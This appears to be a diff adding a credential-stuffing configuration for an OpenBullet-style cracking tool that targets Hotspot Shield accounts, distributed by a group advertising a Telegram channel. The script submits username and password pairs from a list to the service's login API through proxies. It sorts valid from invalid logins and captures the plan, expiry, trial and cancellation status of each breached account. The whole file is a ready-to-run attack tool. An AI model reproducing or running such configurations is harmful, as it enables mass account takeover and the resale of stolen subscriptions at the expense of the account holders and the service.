@@ -1,0 +1,75 @@
+[SETTINGS]
+{
+  "Name": "Hotspot Shield",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-14T15:21:50.0737806+01:00",
+  "AdditionalInfo": "JOIN US ON TELEGRAM : https://t.me/shieldteam1",
+  "Author": "Shield",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#SHIELD FUNCTION URLEncode "<USER>" -> VAR "U" 
+
+#SHIELD FUNCTION URLEncode "<PASS>" -> VAR "P" 
+
+#SHIELD REQUEST POST " https://hotspotshield.aura.com/api/user/login" 
+  CONTENT "login=<U>&password=<P>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: hotspotshield.aura.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 48" 
+  HEADER "Origin: https://hotspotshield.aura.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://hotspotshield.aura.com/sign-in" 
+  HEADER "TE: Trailers" 
+
+#SHIELD KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":true" 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":false" 
+    KEY "message\":\"COMMON.LOGIN\\/PWD INCORRECT" 
+
+#SHIELD REQUEST GET "https://hotspotshield.aura.com/api/user/info" 
+  
+  HEADER "Host: hotspotshield.aura.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://hotspotshield.aura.com/sign-in" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#SHIELDEXPIRED PARSE "<SOURCE>" JSON "isExpired" -> CAP "isExpired" 
+
+#planSHIELD PARSE "<SOURCE>" JSON "plan" -> CAP "plan" 
+
+#cancelTypeSHIELD PARSE "<SOURCE>" JSON "cancelType" -> CAP "cancelType" 
+
+#isTrialSHIELD PARSE "<SOURCE>" JSON "isTrial" -> CAP "isTrial" 
+
